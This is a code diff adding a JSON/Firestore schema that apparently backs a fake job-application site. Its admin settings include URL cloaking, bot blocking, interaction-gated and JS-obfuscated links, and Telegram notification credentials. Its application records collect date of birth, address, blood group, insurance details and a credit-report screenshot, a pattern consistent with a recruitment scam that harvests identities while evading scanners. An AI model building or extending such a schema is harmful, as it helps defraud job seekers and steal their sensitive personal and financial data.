@@ -1,0 +1,95 @@
+{
+  "entities": {
+    "Settings": {
+      "title": "Settings",
+      "description": "Application-wide settings managed from the Admin Panel.",
+      "type": "object",
+      "properties": {
+        "companyName": { "type": "string", "description": "The name of the company." },
+        "logoName": { "type": "string", "description": "The name of the Lucide icon used as the logo." },
+        "reviewText": { "type": "string", "description": "The text shown in the Application Review step." },
+        "creditReportButtonText": { "type": "string", "description": "The text on the credit report button." },
+        "creditReportUrl": { "type": "string", "description": "The destination URL for the credit report (may be cloaked)." },
+        "isCloakingEnabled": { "type": "boolean", "description": "Whether URL cloaking is enabled." },
+        "blockBots": { "type": "boolean", "description": "Block known bots from seeing the link." },
+        "requireInteraction": { "type": "boolean", "description": "Require user interaction before revealing the link." },
+        "obfuscateUrl": { "type": "boolean", "description": "Use advanced JS obfuscation for the URL." },
+        "seoTitle": { "type": "string", "description": "The page title for SEO." },
+        "seoDescription": { "type": "string", "description": "The social description for SEO." },
+        "seoThumbnail": { "type": "string", "description": "The social thumbnail image URL." },
+        "footerText": { "type": "string", "description": "The copyright text in the footer." },
+        "teamImage": { "type": "string", "description": "The image URL for the team section." },
+        "teamImageSize": { "type": "string", "description": "Size of the team image (small, medium, large)." },
+        "teamTitle": { "type": "string", "description": "The title text for the team section." },
+        "teamDescription": { "type": "string", "description": "The description text for the team section." },
+        "logoSize": { "type": "string", "description": "Size of the logo (small, medium, large)." },
+        "socialLinks": { "type": "object", "description": "Social media URLs." },
+        "step3Title": { "type": "string", "description": "Title for Step 3." },
+        "step4Title1": { "type": "string", "description": "First title for Step 4." },
+        "step4Text1": { "type": "string", "description": "First text for Step 4." },
+        "step4Title2": { "type": "string", "description": "Second title for Step 4." },
+        "step4Text2": { "type": "string", "description": "Second text for Step 4." },
+        "step4Note": { "type": "string", "description": "Note text for Step 4." },
+        "bonusTitle": { "type": "string", "description": "Title for the Recruitment Bonus section." },
+        "bonusDescription": { "type": "string", "description": "Description for the Recruitment Bonus section." },
+        "telegramBotToken": { "type": "string", "description": "The Telegram bot token for notifications." },
+        "telegramChatId": { "type": "string", "description": "The Telegram chat ID for notifications." },
+        "updatedAt": { "type": "string", "format": "date-time", "description": "The last time settings were updated." }
+      },
+      "required": ["companyName", "logoName", "reviewText", "creditReportButtonText", "creditReportUrl", "isCloakingEnabled"]
+    },
+    "Application": {
+      "title": "Application",
+      "description": "A job application submitted by a user.",
+      "type": "object",
+      "properties": {
+        "firstName": { "type": "string" },
+        "lastName": { "type": "string" },
+        "position": { "type": "string" },
+        "dob": { "type": "string" },
+        "email": { "type": "string", "format": "email" },
+        "phone": { "type": "string" },
+        "addressLine1": { "type": "string" },
+        "city": { "type": "string" },
+        "zipCode": { "type": "string" },
+        "country": { "type": "string" },
+        "linkedInProfile": { "type": "string" },
+        "specializedField": { "type": "string" },
+        "healthcareInsurance": { "type": "string" },
+        "bloodGroup": { "type": "string" },
+        "applicationId": { "type": "string", "description": "8-digit alphanumeric ID." },
+        "scheduledCallTime": { "type": "string", "description": "Persistent random call time within 3 days." },
+        "creditReportScreenshot": { "type": "string", "description": "Base64 encoded screenshot of the credit report." },
+        "submittedAt": { "type": "string", "format": "date-time" }
+      },
+      "required": ["firstName", "lastName", "email", "phone", "position", "dob"]
+    },
+    "VisitorLog": {
+      "title": "Visitor Log",
+      "description": "Log of a visitor to the site.",
+      "type": "object",
+      "properties": {
+        "country": { "type": "string" },
+        "countryCode": { "type": "string" },
+        "device": { "type": "string" },
+        "browser": { "type": "string" },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "isClick": { "type": "boolean" }
+      }
+    }
+  },
+  "firestore": {
+    "/settings/main": {
+      "schema": "Settings",
+      "description": "The main settings document."
+    },
+    "/applications/{applicationId}": {
+      "schema": "Application",
+      "description": "Collection of job applications."
+    },
+    "/visitor_logs/{logId}": {
+      "schema": "VisitorLog",
+      "description": "Collection of visitor logs."
+    }
+  }
+}
